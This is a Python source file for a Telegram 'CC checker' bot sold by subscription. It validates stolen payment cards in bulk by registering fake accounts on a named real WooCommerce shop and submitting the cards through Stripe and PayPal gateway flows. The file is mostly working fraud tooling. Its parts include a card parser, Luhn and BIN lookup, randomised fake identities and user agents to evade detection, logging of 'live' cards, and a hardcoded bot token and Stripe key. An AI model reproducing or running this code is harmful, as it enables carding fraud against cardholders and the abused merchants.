#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Obeida Online - Real Multi Gateway CC Checker Bot
Version: 10.0 - Three Gateways with Mass Check Manager
Author: @ObeidaOnline
Channel: https://t.me/ObeidaTrading
"""

# ==================== التحقق من إصدار Python ====================
import sys
import platform

print(f"📌 إصدار Python: {sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}")
print(f"📌 نظام التشغيل: {platform.system()} {platform.release()}")

# ==================== المكتبات المطلوبة ====================
import time
import json
import random
import string
import re
import os
import uuid
import threading
import asyncio
from datetime import datetime, timedelta
from typing import Dict, List, Tuple, Optional, Any
from urllib.parse import urlparse
import http.server
import socketserver
import shutil
import warnings

# استيراد المكتبات الخارجية
try:
    import requests
    import aiohttp
    from fake_useragent import UserAgent
    from faker import Faker
    from colorama import init, Fore, Style
    import telebot
    from telebot import types
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
except ImportError as e:
    print(f"❌ خطأ في استيراد المكتبات: {e}")
    sys.exit(1)

# تجاهل التحذيرات
warnings.filterwarnings("ignore")

# تهيئة الألوان
init(autoreset=True)

# ==================== إعدادات البوت ====================
BOT_TOKEN = "8375573526:AAFa882xWsLWl6LAfl0IcaZEU12hyP6YIy0"
ADMIN_IDS = [6207431030]
CHANNEL_USERNAME = "@ObeidaTrading"
DEV_CONTACT = "@Sz2zv"
BOT_USERNAME = "ObeidaOnlineBot"

CHANNEL_LINK = "https://t.me/ObeidaTrading"
SUPPORT_LINK = "https://t.me/Sz2zv"

# مجلدات التخزين
DATA_FOLDER = "data"
BACKUP_FOLDER = "backups"
TEMP_FOLDER = "temp"

# إنشاء المجلدات تلقائياً
os.makedirs(DATA_FOLDER, exist_ok=True)
os.makedirs(BACKUP_FOLDER, exist_ok=True)
os.makedirs(TEMP_FOLDER, exist_ok=True)

# ملفات التخزين
USERS_FILE = os.path.join(DATA_FOLDER, "users.json")
APPROVED_CARDS_FILE = os.path.join(DATA_FOLDER, "approved.txt")
DECLINED_CARDS_FILE = os.path.join(DATA_FOLDER, "declined.txt")
STATS_FILE = os.path.join(DATA_FOLDER, "stats.json")
SETTINGS_FILE = os.path.join(DATA_FOLDER, "settings.json")
GROUPS_FILE = os.path.join(DATA_FOLDER, "groups.json")

# ==================== إعدادات البوابات ====================
GATES = {
    "stripe1": {
        "name": "💳 Stripe Auth v1",
        "description": "فحص بطاقات عبر بوابة Stripe الأولى",
        "command": "st1",
        "mass_command": "st1m",
        "enabled": True,
        "timeout": 30,
        "icon": "💳",
        "default": True
    },
    "stripe2": {
        "name": "💎 Stripe Auth v2",
        "description": "فحص بطاقات عبر بوابة Stripe الثانية",
        "command": "st2",
        "mass_command": "st2m",
        "enabled": True,
        "timeout": 30,
        "icon": "💎",
        "default": False
    },
    "paypal": {
        "name": "💸 PayPal Charge",
        "description": "فحص بطاقات عبر PayPal Commerce",
        "command": "pay",
        "mass_command": "paym",
        "enabled": True,
        "timeout": 30,
        "icon": "💸",
        "default": False
    }
}

# ==================== نظام الاشتراكات ====================
SUBSCRIPTION_PLANS = {
    "day": {"name": "يومي", "price": "5K ID", "duration": 1},
    "week": {"name": "أسبوعي", "price": "15K ID", "duration": 7},
    "month": {"name": "شهري", "price": "40K ID", "duration": 30},
    "3months": {"name": "3 أشهر", "price": "100K ID", "duration": 90},
    "6months": {"name": "6 أشهر", "price": "180K ID", "duration": 180},
    "year": {"name": "سنوي", "price": "300K ID", "duration": 365}
}

# ==================== تهيئة البوت ====================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
fake = Faker()
ua = UserAgent()

# متغيرات عامة
user_last_file = {}

# ==================== إدارة البيانات ====================
class DataManager:
    
    @staticmethod
    def init_files():
        """تهيئة جميع الملفات تلقائياً"""
        if not os.path.exists(USERS_FILE):
            users = {}
            for admin_id in ADMIN_IDS:
                users[str(admin_id)] = {
                    "user_id": admin_id,
                    "username": "admin",
                    "first_name": "Admin",
                    "joined_date": datetime.now().isoformat(),
                    "is_admin": True,
                    "is_subscribed": True,
                    "subscription": {"plan": "lifetime", "expiry": "2099-12-31", "active": True},
                    "usage": {"total_checks": 0, "approved": 0, "declined": 0},
                    "default_gate": "stripe1"
                }
            DataManager.save_json(USERS_FILE, users)
        
        if not os.path.exists(STATS_FILE):
            DataManager.save_json(STATS_FILE, {
                "total_checks": 0,
                "total_approved": 0,
                "total_declined": 0,
                "gates_usage": {},
                "daily_stats": {},
                "last_backup": None
            })
        
        if not os.path.exists(SETTINGS_FILE):
            DataManager.save_json(SETTINGS_FILE, {
                "auto_backup": True,
                "backup_interval_hours": 24,
                "auto_clean": True,
                "clean_days": 30,
                "maintenance_mode": False,
                "maintenance_message": "البوت تحت الصيانة حالياً",
                "default_check_gate": "stripe1",
                "group_mode": True,
                "require_sub_in_groups": True
            })
        
        if not os.path.exists(GROUPS_FILE):
            DataManager.save_json(GROUPS_FILE, {
                "allowed_groups": [],
                "blocked_groups": [],
                "group_settings": {}
            })
        
        for file in [APPROVED_CARDS_FILE, DECLINED_CARDS_FILE]:
            if not os.path.exists(file):
                with open(file, 'w', encoding='utf-8') as f:
                    f.write(f"# {'Approved' if 'approved' in file else 'Declined'} Cards\n")
                    f.write(f"# Created: {datetime.now()}\n")
    
    @staticmethod
    def load_json(file_path: str, default: Any = None) -> Any:
        try:
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    return json.load(f)
            return default if default is not None else {}
        except Exception:
            return default if default is not None else {}
    
    @staticmethod
    def save_json(file_path: str, data: Any) -> bool:
        try:
            if os.path.exists(file_path) and file_path.endswith('.json'):
                backup_path = os.path.join(BACKUP_FOLDER, f"{os.path.basename(file_path)}.{int(time.time())}.bak")
                shutil.copy2(file_path, backup_path)
            
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4, ensure_ascii=False)
            return True
        except Exception as e:
            print(f"❌ خطأ في حفظ {file_path}: {e}")
            return False
    
    @staticmethod
    def load_users() -> Dict:
        DataManager.init_files()
        users = DataManager.load_json(USERS_FILE, {})
        
        for uid, user in users.items():
            if "usage" not in user:
                user["usage"] = {"total_checks": 0, "approved": 0, "declined": 0}
            if "subscription" not in user:
                user["subscription"] = {"active": False}
            if "default_gate" not in user:
                user["default_gate"] = "stripe1"
        
        return users
    
    @staticmethod
    def save_users(users: Dict) -> bool:
        return DataManager.save_json(USERS_FILE, users)
    
    @staticmethod
    def load_stats() -> Dict:
        DataManager.init_files()
        stats = DataManager.load_json(STATS_FILE, {
            "total_checks": 0,
            "total_approved": 0,
            "total_declined": 0,
            "gates_usage": {},
            "daily_stats": {}
        })
        
        defaults = {
            "total_checks": 0,
            "total_approved": 0,
            "total_declined": 0,
            "gates_usage": {},
            "daily_stats": {},
            "last_backup": None
        }
        
        for key, value in defaults.items():
            if key not in stats:
                stats[key] = value
        
        return stats
    
    @staticmethod
    def save_stats(stats: Dict) -> bool:
        return DataManager.save_json(STATS_FILE, stats)
    
    @staticmethod
    def load_settings() -> Dict:
        return DataManager.load_json(SETTINGS_FILE, {
            "auto_backup": True,
            "backup_interval_hours": 24,
            "auto_clean": True,
            "clean_days": 30,
            "maintenance_mode": False,
            "default_check_gate": "stripe1",
            "group_mode": True,
            "require_sub_in_groups": True
        })
    
    @staticmethod
    def save_settings(settings: Dict) -> bool:
        return DataManager.save_json(SETTINGS_FILE, settings)
    
    @staticmethod
    def load_groups() -> Dict:
        return DataManager.load_json(GROUPS_FILE, {
            "allowed_groups": [],
            "blocked_groups": [],
            "group_settings": {}
        })
    
    @staticmethod
    def save_groups(groups: Dict) -> bool:
        return DataManager.save_json(GROUPS_FILE, groups)
    
    @staticmethod
    def save_card_result(card: str, gate: str, response: str, user_id: int, is_approved: bool):
        try:
            file_path = APPROVED_CARDS_FILE if is_approved else DECLINED_CARDS_FILE
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {gate} | User:{user_id} | {card} | {response}\n")
        except:
            pass
    
    @staticmethod
    def get_user_subscription(user_id: int) -> Optional[Dict]:
        users = DataManager.load_users()
        user = users.get(str(user_id), {})
        sub = user.get("subscription", {})
        if sub.get("active"):
            expiry = sub.get("expiry")
            if expiry and expiry != "2099-12-31":
                try:
                    expiry_date = datetime.fromisoformat(expiry)
                    if expiry_date < datetime.now():
                        sub["active"] = False
                        DataManager.save_users(users)
                        return None
                except:
                    pass
            return sub
        return None
    
    @staticmethod
    def check_access(user_id: int, chat_id: int = None) -> bool:
        if user_id in ADMIN_IDS:
            return True
        
        settings = DataManager.load_settings()
        if settings.get("maintenance_mode", False):
            return False
        
        if chat_id and chat_id < 0:
            groups = DataManager.load_groups()
            if chat_id in groups.get("blocked_groups", []):
                return False
            allowed = groups.get("allowed_groups", [])
            if allowed and chat_id not in allowed:
                return False
            group_set = groups.get("group_settings", {}).get(str(chat_id), {})
            if group_set.get("disabled", False):
                return False
            if settings.get("require_sub_in_groups", True):
                return DataManager.get_user_subscription(user_id) is not None
            return True
        
        return DataManager.get_user_subscription(user_id) is not None
    
    @staticmethod
    def get_user_default_gate(user_id: int) -> str:
        users = DataManager.load_users()
        user = users.get(str(user_id), {})
        return user.get("default_gate", "stripe1")
    
    @staticmethod
    def set_user_default_gate(user_id: int, gate: str) -> bool:
        if gate not in GATES:
            return False
        users = DataManager.load_users()
        uid = str(user_id)
        if uid not in users:
            users[uid] = {
                "user_id": user_id,
                "joined_date": datetime.now().isoformat(),
                "usage": {"total_checks": 0, "approved": 0, "declined": 0}
            }
        users[uid]["default_gate"] = gate
        return DataManager.save_users(users)
    
    @staticmethod
    def add_subscription(user_id: int, days: int) -> bool:
        users = DataManager.load_users()
        uid = str(user_id)
        
        if uid not in users:
            users[uid] = {
                "user_id": user_id,
                "joined_date": datetime.now().isoformat(),
                "usage": {"total_checks": 0, "approved": 0, "declined": 0}
            }
        
        expiry = datetime.now() + timedelta(days=days)
        
        plan_name = "مخصص"
        for plan_key, plan in SUBSCRIPTION_PLANS.items():
            if plan["duration"] == days:
                plan_name = plan["name"]
                break
        
        users[uid]["subscription"] = {
            "plan": plan_name,
            "expiry": expiry.isoformat(),
            "active": True,
            "added_by": "admin",
            "added_date": datetime.now().isoformat(),
            "duration_days": days
        }
        
        return DataManager.save_users(users)
    
    @staticmethod
    def remove_subscription(user_id: int) -> bool:
        users = DataManager.load_users()
        if str(user_id) in users:
            users[str(user_id)]["subscription"] = {"active": False}
            return DataManager.save_users(users)
        return False
    
    @staticmethod
    def update_usage(user_id: int, gate: str, result: str):
        users = DataManager.load_users()
        stats = DataManager.load_stats()
        
        uid = str(user_id)
        if uid not in users:
            users[uid] = {
                "user_id": user_id,
                "joined_date": datetime.now().isoformat(),
                "usage": {"total_checks": 0, "approved": 0, "declined": 0}
            }
        
        is_approved = any(x in result for x in ["✅", "LIVE", "Approved", "approved", "UwU", "CHARGED"])
        
        usage = users[uid].get("usage", {"total_checks": 0, "approved": 0, "declined": 0})
        usage["total_checks"] += 1
        
        if is_approved:
            usage["approved"] += 1
            stats["total_approved"] = stats.get("total_approved", 0) + 1
        else:
            usage["declined"] += 1
            stats["total_declined"] = stats.get("total_declined", 0) + 1
        
        users[uid]["usage"] = usage
        
        stats["total_checks"] = stats.get("total_checks", 0) + 1
        stats["gates_usage"][gate] = stats["gates_usage"].get(gate, 0) + 1
        
        today = datetime.now().strftime("%Y-%m-%d")
        if today not in stats["daily_stats"]:
            stats["daily_stats"][today] = {"checks": 0, "approved": 0}
        stats["daily_stats"][today]["checks"] += 1
        if is_approved:
            stats["daily_stats"][today]["approved"] += 1
        
        DataManager.save_users(users)
        DataManager.save_stats(stats)
    
    @staticmethod
    def auto_backup():
        settings = DataManager.load_settings()
        if not settings.get("auto_backup", True):
            return
        
        stats = DataManager.load_stats()
        last_backup = stats.get("last_backup")
        
        if last_backup:
            try:
                last_time = datetime.fromisoformat(last_backup)
                hours_passed = (datetime.now() - last_time).total_seconds() / 3600
                if hours_passed < settings.get("backup_interval_hours", 24):
                    return
            except:
                pass
        
        backup_name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        backup_dir = os.path.join(BACKUP_FOLDER, backup_name)
        os.makedirs(backup_dir, exist_ok=True)
        
        for file in os.listdir(DATA_FOLDER):
            src = os.path.join(DATA_FOLDER, file)
            if os.path.isfile(src):
                dst = os.path.join(backup_dir, file)
                shutil.copy2(src, dst)
        
        stats["last_backup"] = datetime.now().isoformat()
        DataManager.save_stats(stats)
        
        backups = sorted([d for d in os.listdir(BACKUP_FOLDER) if d.startswith("backup_")])
        if len(backups) > 10:
            for old_backup in backups[:-10]:
                shutil.rmtree(os.path.join(BACKUP_FOLDER, old_backup))
        
        print(f"✅ تم عمل نسخة احتياطية: {backup_name}")
    
    @staticmethod
    def auto_clean():
        settings = DataManager.load_settings()
        if not settings.get("auto_clean", True):
            return
        
        clean_days = settings.get("clean_days", 30)
        cutoff = datetime.now() - timedelta(days=clean_days)
        
        for file_path in [APPROVED_CARDS_FILE, DECLINED_CARDS_FILE]:
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                
                new_lines = []
                for line in lines:
                    if line.startswith('#'):
                        new_lines.append(line)
                    else:
                        try:
                            date_str = line.split(']')[0].strip('[')
                            line_date = datetime.strptime(date_str, '%Y-%m-%d %H:%M:%S')
                            if line_date > cutoff:
                                new_lines.append(line)
                        except:
                            new_lines.append(line)
                
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.writelines(new_lines)
        
        print(f"✅ تم التنظيف التلقائي للبيانات الأقدم من {clean_days} يوم")

# ==================== أدوات مساعدة ====================
class Helpers:
    @staticmethod
    def parse_card(card_str: str) -> Optional[Dict]:
        try:
            card_str = re.sub(r'[;:,\s/]+', '|', card_str.strip())
            if '|' in card_str:
                parts = card_str.split('|')
                if len(parts) >= 4:
                    number = re.sub(r'\D', '', parts[0])
                    month = re.sub(r'\D', '', parts[1])
                    year = re.sub(r'\D', '', parts[2])
                    cvv = re.sub(r'\D', '', parts[3])
                    
                    if len(number) >= 15 and len(number) <= 19:
                        if len(month) == 1:
                            month = f"0{month}"
                        if len(year) == 4:
                            year = year[-2:]
                        if len(cvv) >= 3 and len(cvv) <= 4:
                            return {
                                'number': number,
                                'month': month,
                                'year': year,
                                'cvv': cvv,
                                'original': card_str
                            }
            return None
        except:
            return None
    
    @staticmethod
    def extract_cards_from_text(text: str) -> List[Dict]:
        cards = []
        lines = text.strip().split('\n')
        for line in lines:
            line = line.strip()
            if line and not line.startswith('#'):
                card = Helpers.parse_card(line)
                if card and Helpers.luhn_check(card['number']):
                    cards.append(card)
        return cards
    
    @staticmethod
    def luhn_check(card_number: str) -> bool:
        try:
            digits = [int(d) for d in card_number if d.isdigit()]
            if len(digits) < 13:
                return False
            checksum = 0
            for i, digit in enumerate(reversed(digits)):
                if i % 2 == 1:
                    digit *= 2
                    if digit > 9:
                        digit -= 9
                checksum += digit
            return checksum % 10 == 0
        except:
            return False
    
    @staticmethod
    def get_card_brand(number: str) -> str:
        patterns = {
            'visa': r'^4',
            'mastercard': r'^5[1-5]',
            'amex': r'^3[47]',
            'discover': r'^6(?:011|5)',
            'jcb': r'^(?:2131|1800|35)'
        }
        for brand, pattern in patterns.items():
            if re.match(pattern, number):
                return brand.capitalize()
        return "Unknown"
    
    @staticmethod
    def get_bin_info(bin_num: str) -> Dict:
        try:
            r = requests.get(f"https://lookup.binlist.net/{bin_num[:6]}", timeout=5)
            if r.status_code == 200:
                data = r.json()
                return {
                    "brand": data.get('scheme', 'Unknown').upper(),
                    "type": data.get('type', 'Unknown').upper(),
                    "bank": data.get('bank', {}).get('name', 'Unknown'),
                    "country": data.get('country', {}).get('name', 'Unknown'),
                    "flag": data.get('country', {}).get('emoji', '🏁')
                }
        except:
            pass
        return {
            "brand": "Unknown",
            "type": "Unknown",
            "bank": "Unknown",
            "country": "Unknown",
            "flag": "🏁"
        }
    
    @staticmethod
    def get_chat_type(chat_id: int) -> str:
        if chat_id > 0:
            return "private"
        return "group"

# ==================== تنسيق النتائج ====================
class ResultFormatter:
    
    @staticmethod
    def format_mass_result_header(total_cards: int, gate_name: str) -> str:
        return f"""
🚀  {gate_name} 🚀
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
"""
    
    @staticmethod
    def format_card_result(card: str, result: str, is_approved: bool) -> str:
        number = card.split('|')[0] if '|' in card else card
        masked = f"{number[:6]}xxxxxx{number[-4:]}"
        status_text = "LIVE" if is_approved else "DECLINED"
        
        if "insufficient" in result.lower():
            status_text = "LIVE - INSUFFICIENT FUNDS"
        elif "cvv" in result.lower():
            status_text = "LIVE - CVV ERROR"
        elif "stolen" in result.lower() or "risk" in result.lower():
            status_text = "LIVE - RISK CARD"
        elif "charged" in result.lower():
            status_text = "CHARGED"
        
        return f"""
𒊹︎︎︎ 𝗖𝗖 ⌁ {masked}
𒊹︎︎︎ 𝗦𝗧𝗔𝗧𝗨𝗦 ⌁ {status_text} | {result}
"""
    
    @staticmethod
    def format_mass_result_footer(approved: int, declined: int, total: int, remaining: int = None) -> str:
        if remaining is None:
            remaining = 0
        return f"""
𒊹︎︎︎ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ ⌁ {approved}
𒊹︎︎︎ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ ⌁ {declined}
𒊹︎︎︎ 𝗥𝗘𝗠𝗔𝗜𝗡 ♻️ ⌁ {remaining}

𝗧𝗢𝗧𝗔𝗟 💀 ➺ [ {total} ]
━━━━━━━━━━━━
🆔 Obeida Online | @ObeidaTrading
"""
    
    @staticmethod
    def format_single_result(card: str, result: str, is_approved: bool, gate_name: str, bin_info: Dict = None) -> str:
        number = card.split('|')[0] if '|' in card else card
        masked = f"{number[:6]}xxxxxx{number[-4:]}"
        
        if is_approved:
            if "charged" in result.lower():
                status_text = "✅ CHARGED - Payment Successful"
            elif "cvv" in result.lower():
                status_text = "💳 LIVE - CVV ERROR"
            elif "insufficient" in result.lower():
                status_text = "💰 LIVE - INSUFFICIENT FUNDS"
            elif "stolen" in result.lower() or "risk" in result.lower():
                status_text = "⚠️ LIVE - RISK CARD"
            else:
                status_text = "✅ LIVE - CARD APPROVED"
        else:
            status_text = "❌ DECLINED"
        
        if bin_info:
            bin_text = f"""
𒊹︎︎︎ 𝗕𝗜𝗡 ⌁ {number[:6]}
𒊹︎︎︎ 𝗕𝗥𝗔𝗡𝗗 ⌁ {bin_info.get('brand', 'Unknown')}
𒊹︎︎︎ 𝗧𝗬𝗣𝗘 ⌁ {bin_info.get('type', 'Unknown')}
𒊹︎︎︎ 𝗕𝗔𝗡𝗞 ⌁ {bin_info.get('bank', 'Unknown')}
𒊹︎︎︎ 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ⌁ {bin_info.get('country', 'Unknown')} {bin_info.get('flag', '🏁')}
"""
        else:
            bin_text = ""
        
        return f"""
🚀  {gate_name} 🚀
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌

𒊹︎︎︎ 𝗖𝗖 ⌁ {masked}
𒊹︎︎︎ 𝗦𝗧𝗔𝗧𝗨𝗦 ⌁ {status_text}
{bin_text}
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
🆔 Obeida Online | @ObeidaTrading
"""
    
    @staticmethod
    def get_loading_animation(frame: int) -> str:
        frames = ["◐", "◓", "◑", "◒"]
        return frames[frame % len(frames)]

# ==================== بوابة Stripe 1 ====================
class StripeGateway1:
    @staticmethod
    def normalize_url(url):
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        url = url.rstrip('/')
        if '/my-account' not in url.lower():
            url += '/my-account'
        if not url.endswith('/'):
            url += '/'
        return url
    
    @staticmethod
    def generate_random_email():
        username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
        number = random.randint(100, 9999)
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
        return f"{username}{number}@{random.choice(domains)}"
    
    @staticmethod
    def gets(s, start, end):
        try:
            start_index = s.index(start) + len(start)
            end_index = s.index(end, start_index)
            return s[start_index:end_index]
        except (ValueError, AttributeError):
            return None
    
    @staticmethod
    async def process_card(site_url: str, card_data: Dict) -> Tuple[bool, str]:
        try:
            site_url = StripeGateway1.normalize_url(site_url or "https://copenhagensilver.com")
            timeout = aiohttp.ClientTimeout(total=70)
            connector = aiohttp.TCPConnector(ssl=False)
            
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                parsed = urlparse(site_url)
                domain = f"{parsed.scheme}://{parsed.netloc}"
                email = StripeGateway1.generate_random_email()
                
                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                    'user-agent': ua.random
                }
                resp = await session.get(site_url, headers=headers)
                resp_text = await resp.text()
                
                register_nonce = (StripeGateway1.gets(resp_text, 'woocommerce-register-nonce" value="', '"') or 
                                 StripeGateway1.gets(resp_text, 'id="woocommerce-register-nonce" value="', '"'))
                
                if register_nonce:
                    password = f"Pass{random.randint(100000, 999999)}!"
                    register_data = {
                        'email': email,
                        'password': password,
                        'woocommerce-register-nonce': register_nonce,
                        'register': 'Register'
                    }
                    await session.post(site_url, headers=headers, data=register_data)
                
                add_payment_url = f"{domain}/my-account/add-payment-method/"
                resp = await session.get(add_payment_url, headers={'user-agent': ua.random})
                payment_page_text = await resp.text()
                
                add_card_nonce = (StripeGateway1.gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or 
                                 StripeGateway1.gets(payment_page_text, 'add_card_nonce":"', '"'))
                
                stripe_key = (StripeGateway1.gets(payment_page_text, '"key":"pk_', '"') or 
                             StripeGateway1.gets(payment_page_text, 'data-key="pk_', '"'))
                
                if not stripe_key:
                    pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
                    if pk_match:
                        stripe_key = pk_match.group(0)
                if not stripe_key:
                    stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
                
                stripe_headers = {
                    'accept': 'application/json',
                    'content-type': 'application/x-www-form-urlencoded',
                    'user-agent': ua.random
                }
                
                stripe_data = {
                    'type': 'card',
                    'card[number]': card_data['number'],
                    'card[cvc]': card_data['cvv'],
                    'card[exp_month]': card_data['month'],
                    'card[exp_year]': card_data['year'],
                    'key': stripe_key,
                    '_stripe_version': '2024-06-20'
                }
                
                pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
                pm_json = await pm_resp.json()
                
                if 'error' in pm_json:
                    return False, pm_json['error']['message']
                
                pm_id = pm_json.get('id')
                if not pm_id:
                    return False, "Failed to create Payment Method"
                
                confirm_headers = {
                    'accept': 'application/json',
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-requested-with': 'XMLHttpRequest',
                    'user-agent': ua.random
                }
                
                if add_card_nonce:
                    confirm_data = {
                        'action': 'wc_stripe_create_and_confirm_setup_intent',
                        'wc-stripe-payment-method': pm_id,
                        '_ajax_nonce': add_card_nonce
                    }
                    confirm_resp = await session.post(f"{domain}/wp-admin/admin-ajax.php", data=confirm_data, headers=confirm_headers)
                    try:
                        result = await confirm_resp.json()
                        if result.get('success'):
                            return True, "✅ Card Approved"
                    except:
                        pass
                
                return False, "❌ Declined"
                
        except Exception as e:
            return False, f"⚠️ Error: {str(e)[:50]}"

# ==================== بوابة Stripe 2 ====================
class StripeGateway2:
    @staticmethod
    def generate_random_email():
        username = ''.join(random.choices(string.ascii_lowercase, k=10))
        return f"{username}@gmail.com"
    
    @staticmethod
    def generate_random_password(length: int = 12):
        characters = string.ascii_letters + string.digits + "!@#$%^&*()"
        return ''.join(random.choices(characters, k=length))
    
    async def process_card(self, card_data: Dict) -> Tuple[bool, str]:
        try:
            site_url = "https://copenhagensilver.com"
            
            async with aiohttp.ClientSession() as session:
                headers = {
                    'referer': f'{site_url}/my-account/',
                    'accept': 'text/html,application/xhtml+xml',
                    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36'
                }
                
                resp = await session.get(f"{site_url}/my-account/", headers=headers)
                html = await resp.text()
                
                register_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', html)
                if not register_match:
                    return False, "❌ Failed to extract register nonce"
                
                register_nonce = register_match.group(1)
                email = self.generate_random_email()
                password = self.generate_random_password()
                
                headers['content-type'] = 'application/x-www-form-urlencoded'
                register_data = {
                    'email': email,
                    'password': password,
                    'woocommerce-register-nonce': register_nonce,
                    'register': 'Register'
                }
                
                await session.post(f"{site_url}/my-account/", headers=headers, data=register_data)
                
                resp = await session.get(f"{site_url}/my-account/add-payment-method/", headers=headers)
                data = await resp.text()
                
                nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', data)
                stripe_pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', data)
                
                if not nonce_match or not stripe_pk_match:
                    return False, "❌ SetupIntent nonce not found"
                
                nonce = nonce_match.group(1)
                pk = stripe_pk_match.group(0)
                
                stripe_headers = {
                    'authority': 'api.stripe.com',
                    'accept': 'application/json',
                    'content-type': 'application/x-www-form-urlencoded',
                    'user-agent': headers['user-agent']
                }
                
                stripe_data = {
                    "type": "card",
                    "card[number]": card_data['number'],
                    "card[cvc]": card_data['cvv'],
                    "card[exp_year]": card_data['year'][-2:],
                    "card[exp_month]": card_data['month'],
                    "key": pk,
                    "_stripe_version": "2024-06-20"
                }
                
                pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
                pm_json = await pm_resp.json()
                
                token = pm_json.get("id")
                if not token:
                    return False, "❌ Invalid card"
                
                confirm_headers = {
                    'accept': '*/*',
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-requested-with': 'XMLHttpRequest',
                    'user-agent': headers['user-agent']
                }
                
                confirm_data = {
                    'action': 'wc_stripe_create_and_confirm_setup_intent',
                    'wc-stripe-payment-method': token,
                    '_ajax_nonce': nonce,
                }
                
                confirm_resp = await session.post(f"{site_url}/wp-admin/admin-ajax.php", headers=confirm_headers, data=confirm_data)
                
                try:
                    result = await confirm_resp.json()
                    if result.get('success'):
                        return True, "✅ Card Approved"
                    else:
                        error_msg = result.get('data', {}).get('error', {}).get('message', 'Declined')
                        return False, f"❌ {error_msg}"
                except:
                    return False, "❌ Unexpected response"
                    
        except Exception as e:
            return False, f"⚠️ Error: {str(e)[:50]}"

# ==================== بوابة PayPal ====================
class PayPalGateway:
    """PayPal Charge Gateway - awwatersheds.org"""
    
    FIRST_NAMES = [
        "James", "Mary", "Robert", "Patricia", "John", "Jennifer", "Michael", "Linda",
        "William", "Elizabeth", "David", "Barbara", "Richard", "Susan", "Joseph", "Jessica",
        "Thomas", "Sarah", "Christopher", "Karen", "Daniel", "Lisa", "Matthew", "Nancy",
        "Anthony", "Betty", "Mark", "Margaret", "Donald", "Sandra", "Steven", "Ashley",
        "Paul", "Dorothy", "Andrew", "Kimberly", "Joshua", "Emily", "Kenneth", "Donna"
    ]
    
    LAST_NAMES = [
        "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
        "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson",
        "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson",
        "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker"
    ]
    
    ADDRESSES = [
        {"line1": "742 Evergreen Terrace", "city": "Springfield", "state": "IL", "zip": "62704"},
        {"line1": "123 Maple Street", "city": "Anytown", "state": "NY", "zip": "10001"},
        {"line1": "456 Oak Avenue", "city": "Riverside", "state": "CA", "zip": "92501"},
        {"line1": "789 Pine Road", "city": "Lakewood", "state": "CO", "zip": "80226"},
        {"line1": "321 Elm Boulevard", "city": "Portland", "state": "OR", "zip": "97201"},
        {"line1": "654 Cedar Lane", "city": "Austin", "state": "TX", "zip": "73301"},
